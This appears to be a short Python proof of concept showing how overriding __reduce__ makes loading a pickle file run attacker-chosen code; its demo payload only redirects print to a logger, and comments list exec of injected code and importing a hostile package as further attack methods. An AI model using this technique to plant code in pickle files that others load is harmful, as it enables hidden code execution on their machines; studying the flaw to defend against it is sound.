#!/usr/bin/env python3

import pickle


class A:

    def __init__(self, x: int = 1, y: int = 2):
        self.x = x
        self.y = y


def patch(*args):
    import builtins
    from loguru import logger
    builtins.print = logger.info
    obj = A(*args)
    return obj


INJECT_CODE = """
import builtins
from loguru import logger
builtins.print = logger.info
"""


def inject_code(obj):

    def reduce_func(self):
        # return A, (self.x, self.y)  # a normal pickle code
        return patch, (self.x, self.y)

        # attck method
        # 1. the easiest way to inject code
        # return exec, (INJECT_CODE, )
        # 2. install a third-party package and place the inject code into the package.
        # return (__import__("attack_package").patch, (self.x, self.y))

    obj.__class__.__reduce__ = reduce_func

    return obj


def load_pickle(file_path):
    with open(file_path, 'rb') as f:
        return pickle.load(f)


def save_pickle(obj, file_path):
    with open(file_path, 'wb') as f:
        pickle.dump(obj, f)


def attack():
    a = A(x=2, y=3)
    a = inject_code(a)
    save_pickle(a, 'patch.pkl')


if __name__ == '__main__':
    # use attack to generate the patch.pkl and then comment it
    # attack()
    print("Before patch: Hello")
    a = load_pickle('patch.pkl')
    print(f"{a.x=}, {a.y=}")
    print("After patch: Hello")
